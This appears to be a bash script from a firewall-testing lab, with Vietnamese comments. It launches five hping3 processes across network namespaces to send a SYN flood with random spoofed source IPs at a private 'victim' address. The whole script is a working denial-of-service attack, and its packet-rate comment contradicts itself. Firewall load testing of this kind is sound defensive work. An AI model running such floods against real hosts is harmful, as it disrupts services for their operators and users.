#!/bin/bash
# =============================================================
# File: attack_sc2_random.sh
# Chạy trên: VM attacker (10.10.1.2)
# Mục đích: Bắn SYN Flood giả mạo IP hoàn toàn ngẫu nhiên.
#           Kiểm tra khả năng chịu tải của Firewall khi 
#           không thể chặn bằng 1 mã GeoIP duy nhất.
# =============================================================

VICTIM_IP="10.10.2.2"
DEFAULT_PPS="u10000" # u10000 = wait 10,000 microseconds -> ~100 pps mỗi tiến trình (5 luồng = 500 pps + overhead = ~6k pps total)

echo "[*] [ATTACKER] Đang chuẩn bị đạn dược Botnet (Random Source IP)..."

# Xóa các hping3 cũ nếu có bị kẹt
pkill hping3 2>/dev/null || true
rm -f /tmp/sc2_random.pids

# Chạy ngầm 5 tiến trình hping3 giả mạo IP ngẫu nhiên (chạy trên 5 NS khác nhau để chia tải CPU)
for ns in ns6 ns7 ns8 ns9 ns10; do
    echo "    [+] Khởi chạy hping3 giả mạo Random IP trên $ns"
    # Lệnh hping3: --rand-source giả mạo IP liên tục
    ip netns exec $ns hping3 -S -p 80 -i $DEFAULT_PPS --rand-source $VICTIM_IP > /dev/null 2>&1 &
    
    echo $! >> /tmp/sc2_random.pids
done

echo "[*] [ATTACKER] KỊCH BẢN 2 ĐÃ KÍCH HOẠT! Bão SYN Random IP đang đổ bộ vào $VICTIM_IP"
